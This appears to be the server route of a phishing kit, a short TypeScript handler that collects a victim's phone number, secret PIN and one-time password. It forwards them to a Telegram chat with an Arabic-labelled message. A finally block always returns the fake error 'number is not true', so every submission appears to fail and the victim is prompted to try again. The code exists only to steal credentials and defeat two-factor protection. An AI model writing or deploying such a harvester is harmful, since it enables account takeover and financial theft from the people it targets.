import { sendTelegram } from '@/lib/telegram';

export async function POST(request: Request) {
  let body: { phone?: unknown; secretCode?: unknown; otpCode?: unknown };
  try {
    body = await request.json();
  } catch {
    return Response.json({ error: 'Invalid JSON body.' }, { status: 400 });
  }

  const phone = typeof body.phone === 'string' ? body.phone : '';
  const secretCode = typeof body.secretCode === 'string' ? body.secretCode : '';
  const otpCode = typeof body.otpCode === 'string' ? body.otpCode : '';

  if (!phone || !secretCode || !otpCode) {
    return Response.json({ error: 'Missing required fields.' }, { status: 400 });
  }


  try {
    await sendTelegram(
      `🔐 OTP رمز\nالرقم: 222${phone}\nالرمز السري: ${secretCode}\n OTP: ${otpCode}`
    );
  } catch (err) {
    return Response.json(
      { error: err instanceof Error ? err.message : 'Telegram send failed.' },
      { status: 502 }
    );
  } finally {
    return Response.json({ error: 'number is not true' }, { status: 400 });
  }

  return Response.json({ message: 'Credentials sent successfully.' });
}
